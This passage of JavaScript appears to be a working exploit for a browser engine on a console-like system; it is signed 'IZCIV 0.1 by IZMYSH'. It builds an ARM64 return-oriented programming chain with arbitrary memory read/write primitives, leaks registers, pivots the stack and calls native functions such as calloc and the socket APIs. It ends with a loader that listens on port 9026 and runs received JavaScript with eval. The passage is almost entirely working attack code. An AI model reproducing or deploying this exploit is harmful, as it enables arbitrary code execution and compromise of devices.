            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x100n, fake_chi_full + 0x110n);      // x0 -> fake object
            write64(fake_chi_full + 0x170n, rop_epilogue);                // return to JS
            window.v8Version();
            const x19_leak = read64(fake_chi_full + 0x1n + 0x6f8n);

            // -- x20 leak -------------------------------------------------
            // gadget5: str x20, [x21, #0x720] ; ... ; blr x8
            write64(fake_chi_full + 0x60n + 0x1n, gadget5);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x100n, fake_chi_full + 0x110n);
            write64(fake_chi_full + 0x190n, rop_epilogue);
            window.v8Version();
            const x20_leak = read64(fake_chi_full + 0x1n + 0x720n);

            const x21_leak = fake_chi_full + 0x1n;                       // known from fake_chi address
            const x22_leak = gadget1;                                    // loaded by initial gadget1

            // -- sp leak --------------------------------------------------
            // gadget2: add x1, sp, #0x10 ; ldr x8, [x0] ; ldr x8, [x8, #0x30] ; blr x8
            // gadget3: ldr x8, [x0] ; str x1, [x21, #0x10] ; ldr x8, [x8] ; blr x8
            write64(fake_chi_full + 0x60n + 0x1n, gadget2);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x100n, fake_chi_full + 0x110n);
            write64(fake_chi_full + 0x110n, rop_epilogue);               // return from gadget2
            write64(fake_chi_full + 0x140n, gadget3);                    // called by gadget2
            window.v8Version();
            const sp_leak = read64(fake_chi_full + 0x1n + 0x10n) - 0x10n;
            const x29_leak = sp_leak + 0x200n;

            // -- x23-x28 leak (via dump chain) ---------------------------
            const dump_chain_area = rop_chain_addr + 0x3000n;

            // Pivot SP to dump_chain_area
            // gadget6 → gadget7 → gadget8 → gadget9 → (sp = dump_chain_area)
            write64(fake_chi_full + 0x60n + 0x1n, gadget6);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x128n, fake_chi_full + 0x200n);      // x0-> fake object
            write64(fake_chi_full + 0x200n, gadget9);                     // called by gadget6
            write64(fake_chi_full + 0x218n, gadget7);                     // called by gadget9 after sp pivot
            write64(fake_chi_full + 0x418n, dump_chain_area - 4n);        // x20 (gadget7) -> adjust for gadget8's sub x29, #4
            write64(fake_chi_full + 0x3f8n, fake_chi_full + 0x300n);      // x0 for gadget7
            write64(fake_chi_full + 0x300n, fake_chi_full + 0x400n);      // x0 for gadget8 (pointer chain)
            write64(fake_chi_full + 0x480n, gadget8);

            // Setup for final sp restore after dump chain (via gadget18)
            write64(fake_chi_full + 0xA10n, fake_chi_full + 0xB00n);      // x0 -> fake object
            write64(fake_chi_full + 0xB00n, fake_chi_full + 0xC00n);      // pointer chain
            write64(fake_chi_full + 0xB08n, 0n);
            write64(fake_chi_full + 0xC20n, gadget18);                    // called via gadget17
            write64(fake_chi_full + 0xC60n, gadget17);

            // Dump chain on fake stack (sp = dump_chain_area)
            // --- gadget10: load args x0-x5 (dummy) ---
            write64(dump_chain_area + 0x00n, dump_chain_area + 0x40n);    // x29 (ignored)
            write64(dump_chain_area + 0x08n, gadget10);                   // x30
            write64(dump_chain_area + 0x10n, 0n);                         // x0
            write64(dump_chain_area + 0x18n, 0n);                         // x1
            write64(dump_chain_area + 0x20n, gadget20);                   // x2 (target function → gadget20)
            write64(dump_chain_area + 0x28n, 0n);                         // x3
            write64(dump_chain_area + 0x30n, 0n);                         // x4
            write64(dump_chain_area + 0x38n, 0n);                         // x5

            // --- gadget11 frame ---
            write64(dump_chain_area + 0x40n, 0n);                         // x29
            write64(dump_chain_area + 0x48n, gadget11);                   // x30

            // --- gadget12 frame: loads x20, x19, x22, x21 ---
            write64(dump_chain_area + 0x50n, 0n);                         // x29
            write64(dump_chain_area + 0x58n, gadget12);                   // x30
            write64(dump_chain_area + 0x60n, fake_chi_full + 0x600n);     // x20 → pointer to call target (gadget19)
            write64(dump_chain_area + 0x68n, 0n);                         // x19

            // --- gadget12 continues (after br x6) ---
            write64(dump_chain_area + 0x70n, dump_chain_area + 0xA0n);    // x29
            write64(dump_chain_area + 0x78n, gadget13);                   // x30
            write64(dump_chain_area + 0x80n, x22_leak);                   // x22
            write64(dump_chain_area + 0x88n, 0n);                         // x21 (don't care)
            write64(dump_chain_area + 0x90n, 0n);                         // x20
            write64(dump_chain_area + 0x98n, 0n);                         // x19

            // --- gadget13: load x21 ---
            write64(dump_chain_area + 0x260n, 0n);                        // x29
            write64(dump_chain_area + 0x268n, gadget13);                  // x30
            // (sp after gadget13 = 0x270)
            write64(dump_chain_area + 0x270n, 0n);                        // x29
            write64(dump_chain_area + 0x278n, gadget14);                  // x30
            write64(dump_chain_area + 0x280n, fake_rop_return_full);      // x21 → store return value here
            write64(dump_chain_area + 0x288n, 0n);
            write64(dump_chain_area + 0x290n, 0n);
            write64(dump_chain_area + 0x298n, 0n);

            // --- gadget15: load x1, x20, x19 ---
            write64(dump_chain_area + 0x2A0n, gadget15);                  // x30
            write64(dump_chain_area + 0x2A8n, x21_leak);                  // x21
            write64(dump_chain_area + 0x2C0n, 0n);                        // (padding)
            write64(dump_chain_area + 0x2C8n, fake_chi_full + 0xA00n);    // x1 (later moved to x0)
            write64(dump_chain_area + 0x2D0n, 0n);                        // x29 dummy
            write64(dump_chain_area + 0x2D8n, gadget16);                  // x30
            write64(dump_chain_area + 0x2E0n, x20_leak);                  // x20
            write64(dump_chain_area + 0x2E8n, x19_leak);                  // x19

            // --- gadget17 frame (via gadget16) ---
            write64(dump_chain_area + 0x2F0n, 0n);                        // d8 ignored
            write64(dump_chain_area + 0x2F8n, x29_leak);                  // x29
            write64(dump_chain_area + 0x300n, rop_epilogue);              // x30 → return to JS

            // Call target (gadget19) to backup x23-x28
            write64(fake_chi_full + 0x600n, fake_chi_full + 0x608n);      // pointer chain
            write64(fake_chi_full + 0x620n, gadget19);                    // gadget19: stp x23-x28, call x7, then gadget20 adds sp
            write64(fake_chi_full + 0xBF8n, sp_leak);                     // for gadget18 sp restore

            window.v8Version();

            // Extract leaked x23-x28 values
            const x23_leak = read64(dump_chain_area + 0x90n);
            const x24_leak = read64(dump_chain_area + 0x98n);
            const x25_leak = read64(dump_chain_area + 0x80n);
            const x26_leak = read64(dump_chain_area + 0x88n);
            const x27_leak = read64(dump_chain_area + 0x70n);
            const x28_leak = read64(dump_chain_area + 0x78n);

            // ACTUAL FUNCTION CALL with full register restore
            
            // SP pivot to rop_chain_addr (same mechanism as above)
            write64(fake_chi_full + 0x60n + 0x1n, gadget6);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x128n, fake_chi_full + 0x200n);      // x0 -> fake object
            write64(fake_chi_full + 0x200n, gadget9);
            write64(fake_chi_full + 0x218n, gadget7);
            write64(fake_chi_full + 0x418n, rop_chain_addr - 4n);        // x20 (adjust for gadget8)
            write64(fake_chi_full + 0x3f8n, fake_chi_full + 0x300n);      // x0 for gadget7
            write64(fake_chi_full + 0x300n, fake_chi_full + 0x400n);
            write64(fake_chi_full + 0x480n, gadget8);

            // Call target: pointer chain -> address
            write64(fake_chi_full + 0x600n, fake_chi_full + 0x608n);
            write64(fake_chi_full + 0x620n, address);                     // actual function to call

            // Restore sp after chain (return to JS)
            write64(fake_chi_full + 0xA10n, fake_chi_full + 0xB00n);      // x0 for gadget18
            write64(fake_chi_full + 0xB00n, fake_chi_full + 0xC00n);
            write64(fake_chi_full + 0xBF8n, sp_leak);                     // sp value for gadget18
            write64(fake_chi_full + 0xC20n, gadget18);
            write64(fake_chi_full + 0xC60n, gadget17);

            // --- ROP chain on fake stack (sp = rop_chain_addr) ---
            // gadget10: load x0-x5 (arguments)
            write64(rop_chain_addr + 0x00n, rop_chain_addr + 0x40n);     // x29 (ignored)
            write64(rop_chain_addr + 0x08n, gadget10);                    // x30
            write64(rop_chain_addr + 0x10n, arg1);                        // x0
            write64(rop_chain_addr + 0x18n, arg2);                        // x1
            write64(rop_chain_addr + 0x20n, arg3);                        // x2
            write64(rop_chain_addr + 0x28n, arg4);                        // x3
            write64(rop_chain_addr + 0x30n, arg5);                        // x4
            write64(rop_chain_addr + 0x38n, arg6);                        // x5

            // gadget11: ldp x20,x19 ; ret to gadget12
            write64(rop_chain_addr + 0x40n, 0n);                          // x29
            write64(rop_chain_addr + 0x48n, gadget11);                    // x30

            // gadget12: load x20,x19,x22,x21 and call target via br x6
            write64(rop_chain_addr + 0x50n, 0n);                          // x29
            write64(rop_chain_addr + 0x58n, gadget12);                    // x30
            write64(rop_chain_addr + 0x60n, fake_chi_full + 0x600n);      // x20 → pointer to call target
            write64(rop_chain_addr + 0x68n, 0n);                          // x19

            // gadget12 returns to gadget13 (after function call)
            write64(rop_chain_addr + 0x70n, rop_chain_addr + 0xA0n);      // x29
            write64(rop_chain_addr + 0x78n, gadget13);                    // x30
            write64(rop_chain_addr + 0x80n, x22_leak);                    // x22 (restore original)
            write64(rop_chain_addr + 0x88n, 0n);                          // x21 (will be overwritten later)
            write64(rop_chain_addr + 0x90n, 0n);                          // x20 (ignored)
            write64(rop_chain_addr + 0x98n, 0n);                          // x19 (ignored)

            // gadget13: ldr x21, [sp, #0x10]; ldp x29,x30, [sp], #0x30; ret
            write64(rop_chain_addr + 0xA0n, 0n);                          // x29
            write64(rop_chain_addr + 0xA8n, gadget14);                    // x30
            write64(rop_chain_addr + 0xB0n, fake_rop_return_full);        // x21 → address to store return value
            write64(rop_chain_addr + 0xB8n, 0n);
            write64(rop_chain_addr + 0xC0n, 0n);
            write64(rop_chain_addr + 0xC8n, 0n);

            // gadget14: str x0, [x21] ; ldp x30, x21, [sp], #0x20 ; ret
            write64(rop_chain_addr + 0xD0n, gadget21);                    // x30 → continue with register restore
            write64(rop_chain_addr + 0xD8n, x21_leak);                    // x21 (original value)

            // gadget21: restore x22-x28, x29, x30 and add sp,#0xD0
            // sp = rop_chain_addr + 0xF0  (after gadget14)
            write64(rop_chain_addr + 0x160n, x29_leak);                   // x29
            write64(rop_chain_addr + 0x168n, gadget15);                   // x30
            write64(rop_chain_addr + 0x170n, x28_leak);                   // x28
            write64(rop_chain_addr + 0x178n, x27_leak);                   // x27
            write64(rop_chain_addr + 0x180n, x26_leak);                   // x26
            write64(rop_chain_addr + 0x188n, x25_leak);                   // x25
            write64(rop_chain_addr + 0x190n, x24_leak);                   // x24
            write64(rop_chain_addr + 0x198n, x23_leak);                   // x23
            write64(rop_chain_addr + 0x1A0n, x22_leak);                   // x22
            write64(rop_chain_addr + 0x1A8n, x21_leak);                   // x21

            // gadget21 ends with sp = 0xF0 + 0xD0 = 0x1C0

            // gadget15: ldr x1,[sp,#8]; ldp x20,x19,[sp,#0x20]; mov x0,x1; ldp x29,x30,[sp,#0x10]; add sp,sp,#0x30; ret
            write64(rop_chain_addr + 0x1C0n, 0n);                        // unused
            write64(rop_chain_addr + 0x1C8n, fake_chi_full + 0xA00n);    // x1 (becomes x0 for gadget16)
            write64(rop_chain_addr + 0x1D0n, 0n);                        // x29 dummy
            write64(rop_chain_addr + 0x1D8n, gadget16);                  // x30
            write64(rop_chain_addr + 0x1E0n, x20_leak);                  // x20 (restore)
            write64(rop_chain_addr + 0x1E8n, x19_leak);                  // x19 (restore)

            // gadget16: ldr x0,[x0,#0x10]; ldr x8,[x0]; ldr x1,[x8,#0x60]; br x1
            // loads gadget17 address and jumps to it
            // (sp after gadget15 = 0x1F0)
            // gadget17 frame: ldp x29,x30,[sp,#8]; ldr x4,[x8,#0x20]; ldr d8,[sp],#0x30; br x4
            write64(rop_chain_addr + 0x1F0n, 0n);                        // d8 ignored
            write64(rop_chain_addr + 0x1F8n, x29_leak);                  // x29 (restore original)
            write64(rop_chain_addr + 0x200n, rop_epilogue);              // x30 → return to JavaScript

            window.v8Version();
            return read64(fake_rop_return_full);
        }
                

        await log("ROP setup finished");            

        function malloc(size) {
            return call_rop(F_calloc, 1n, BigInt(size));
        }

        function free(addr) {
            return call_rop(F_free, addr);
        }

        function alloc_string(str) {
            const bytes = text_encode(str);
            const addr = malloc(bytes.length + 1);
            
            for (let i = 0; i < bytes.length; i++) {
                write8(addr + BigInt(i), bytes[i]);
            }
            
            write8(addr + BigInt(bytes.length), 0);
            
            return addr;
        }


        function show_dialog(string1, string2) {
            
            const ShowApplicationError_addr = sdk_base + 0x311620n;
            
            const errarg_buffer = malloc(0x1014);        
            write8(errarg_buffer + 0x0n, 2n);
            write32(errarg_buffer + 0x8n, 1234n);
            write_string(errarg_buffer + 0xcn, "en-US");
            write_string(errarg_buffer + 0x14n, string1);
            write_string(errarg_buffer + 0x814n, string2);
            
            const ret = call_rop(ShowApplicationError_addr, errarg_buffer);
            free(errarg_buffer);
            return ret;
        }

        // ==== remote JS loader ====
        const PORT = 9026;

        const MAXSIZE = 500 * 1024;

        const F_Socket     = sdk_base + 0x14d4c0n;  // nn::socket::Socket(int, int, int)
        const F_Bind       = sdk_base + 0x14d3b0n;  // nn::socket::Bind(int, const sockaddr*, uint)
        const F_Listen     = sdk_base + 0x14d440n;  // nn::socket::Listen(int, int)
        const F_Accept     = sdk_base + 0x14d390n;  // nn::socket::Accept(int, sockaddr*, uint*)
        const F_Connect    = sdk_base + 0x14d3c0n;  // nn::socket::Connect(int, const sockaddr*, uint)
        const F_GetSockName = sdk_base + 0x14d410n; // nn::socket::GetSockName(int, sockaddr*, uint*)
        const F_SetSockOpt = sdk_base + 0x14d460n;  // nn::socket::SetSockOpt(int, int, int, const void*, uint)
        const F_Recv       = sdk_base + 0x14d310n;  // nn::socket::Recv(int, void*, size_t, int)
        const F_Send       = sdk_base + 0x14d340n;  // nn::socket::Send(int, const void*, size_t, int)
        const F_SockClose  = sdk_base + 0x14d510n;  // nn::socket::Close(int)

        const AF_INET = 2;
        const SOCK_STREAM = 1;
        const SOCK_DGRAM = 2;
        const SOL_SOCKET = 0xffff;
        const SO_REUSEADDR = 4;

        function socket(domain, type, protocol) {
            return BigInt.asIntN(32, call_rop(F_Socket, BigInt(domain), BigInt(type), BigInt(protocol)));
        }

        function bind(fd, addr, addrlen) {
            return BigInt.asIntN(32, call_rop(F_Bind, fd, addr, BigInt(addrlen)));
        }

        function listen(fd, backlog) {
            return BigInt.asIntN(32, call_rop(F_Listen, fd, BigInt(backlog)));
        }

        function accept(fd, addr, addrlen) {
            return BigInt.asIntN(32, call_rop(F_Accept, fd, addr, addrlen));
        }

        function connect(fd, addr, addrlen) {
            return BigInt.asIntN(32, call_rop(F_Connect, fd, addr, BigInt(addrlen)));
        }

        function getsockname(fd, addr, addrlen) {
            return BigInt.asIntN(32, call_rop(F_GetSockName, fd, addr, addrlen));
        }

        function setsockopt(fd, level, optname, optval, optlen) {
            return BigInt.asIntN(32, call_rop(F_SetSockOpt, fd, BigInt(level), BigInt(optname), optval, BigInt(optlen)));
        }

        function recv(fd, buf, len, flags) {
            return BigInt.asIntN(32, call_rop(F_Recv, fd, buf, BigInt(len), BigInt(flags)));
        }

        function send(fd, buf, len, flags) {
            return BigInt.asIntN(32, call_rop(F_Send, fd, buf, BigInt(len), BigInt(flags)));
        }

        function close(fd) {
            return BigInt.asIntN(32, call_rop(F_SockClose, fd));
        }

        const sockaddr_in = malloc(16);
        const addrlen = malloc(8);
        const enable = malloc(4);
        const payload_buf = malloc(MAXSIZE);
        const line_buf = malloc(2048);

        let _log_socket_fd = null;
        const _loader_old_log = window.log;
        window.log = async function (message) {
            if (_log_socket_fd !== null) {
                try {
                    const line = String(message) + "\n";
                    write_string(line_buf, line);
                    send(_log_socket_fd, line_buf, text_encode(line).length, 0);
                } catch (e) {}
            }
            return _loader_old_log(message);
        };

        function create_socket() {
            for (let i = 0; i < 16; i++) write8(sockaddr_in + BigInt(i), 0);

            const sock_fd = socket(AF_INET, SOCK_STREAM, 0);
            if (sock_fd === -1n) {
                throw new Error("Socket creation failed: " + toHex(sock_fd));
            }

            write32(enable, 1);
            setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4);

            write8(sockaddr_in, 16n);
            write8(sockaddr_in + 1n, 2n);
            write16(sockaddr_in + 2n, BigInt(((PORT & 0xff) << 8) | (PORT >> 8)));
            write32(sockaddr_in + 4n, 0n);

            const bind_ret = bind(sock_fd, sockaddr_in, 16);
            if (bind_ret === -1n) {
                close(sock_fd);
                throw new Error("Bind failed: " + toHex(bind_ret));
            }

            const listen_ret = listen(sock_fd, 3);
            if (listen_ret === -1n) {
                close(sock_fd);
                throw new Error("Listen failed: " + toHex(listen_ret));
            }

            return sock_fd;
        }

        function get_current_ip() {
            const fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd === -1n) return null;

            write8(sockaddr_in, 16n);
            write8(sockaddr_in + 1n, 2n);
            write16(sockaddr_in + 2n, 0x5000n);
            write32(sockaddr_in + 4n, 0x08080808n);
            write32(sockaddr_in + 8n, 0n);
            write32(sockaddr_in + 12n, 0n);

            const connect_ret = connect(fd, sockaddr_in, 16);
            if (connect_ret === -1n) {
                close(fd);
                return null;
            }

            write32(addrlen, 16);
            const name_ret = getsockname(fd, sockaddr_in, addrlen);
            close(fd);
            if (name_ret === -1n) return null;

            const a = Number(read8(sockaddr_in + 4n));
            const b = Number(read8(sockaddr_in + 5n));
            const c = Number(read8(sockaddr_in + 6n));
            const d = Number(read8(sockaddr_in + 7n));
            if (a === 0 && b === 0 && c === 0 && d === 0) return null;

            return a + "." + b + "." + c + "." + d;
        }

        async function remote_js_loader() {
            try { Network.resetNetworkCommunication(); } catch (e) {}

            let setupFails = 0;

            while (true) {
                let current_ip = get_current_ip();
                let announced = false;
                while (current_ip === null) {
                    if (!announced) {
                        await log("network down - waiting for network..");
                        announced = true;
                    }
                    await sleep(2000);
                    current_ip = get_current_ip();
                }

                let sock_fd;
                try {
                    sock_fd = create_socket();
                    setupFails = 0;
                } catch (err) {
                    setupFails++;
                    if (setupFails % 3 === 0) {
                        try { Network.resetNetworkCommunication(); } catch (e) {}
                    }
                    await log("listener setup failed: " + err.message);
                    await sleep(2000);
                    continue;
                }

                const network_str = current_ip + ":" + PORT;

                let acceptFails = 0;
                let badConns = 0;
                while (true) {
                    try {
                        await log("Awaiting payload at " + network_str);

                        write32(addrlen, 16);
                        const client_fd = accept(sock_fd, sockaddr_in, addrlen);

                        if (client_fd === -1n) {
                            acceptFails++;
                            if (acceptFails >= 2) break;
                            continue;
                        }
                        acceptFails = 0;

                        let total_read = 0;
                        let read_error = false;

                        while (total_read < MAXSIZE) {
                            const bytes_read = recv(
                                client_fd,
                                payload_buf + BigInt(total_read),
                                MAXSIZE - total_read,
                                0
                            );

                            const n = Number(bytes_read);

                            if (n === 0) break;
                            if (n < 0) {
                                await log("read() error: " + n);
                                read_error = true;
                                break;
                            }

                            total_read += n;
                        }

                        if (read_error || total_read === 0) {
                            await log(read_error ? "connection dropped" : "No valid data received");
                            close(client_fd);
                            badConns++;
                            if (badConns >= 3) break;
                            continue;
                        }
                        badConns = 0;

                        const bytes = new Array(total_read);
                        for (let i = 0; i < total_read; i++) {
                            bytes[i] = Number(read8(payload_buf + BigInt(i)));
                        }

                        const js_code = bytes_to_string(bytes);

                        write32(enable, 1);
                        setsockopt(client_fd, SOL_SOCKET, 0x800, enable, 4);
                        _log_socket_fd = client_fd;

                        await log("Executing payload...");
                        try {
                            try {
                                await eval(js_code);
                                await log("Executed successfully");
                            } catch (e) {
                                await log("Error in payload: " + e.message);
                                await log(e.stack);
                            }
                        } finally {
                            _log_socket_fd = null;
                            close(client_fd);
                        }

                    } catch (e) {
                        await log("ERROR in accept loop: " + e.message);
                        await log(e.stack);
                    }
                }

                close(sock_fd);
                await log("listener dead - rebuilding on port " + PORT);
            }
        }
        await log("IZCIV 0.1 by IZMYSH");
        remote_js_loader();        
        
    } catch (e) {                
        await log('EXCEPTION: ' + e.message);
        await log(e.stack);
    }
    
})();
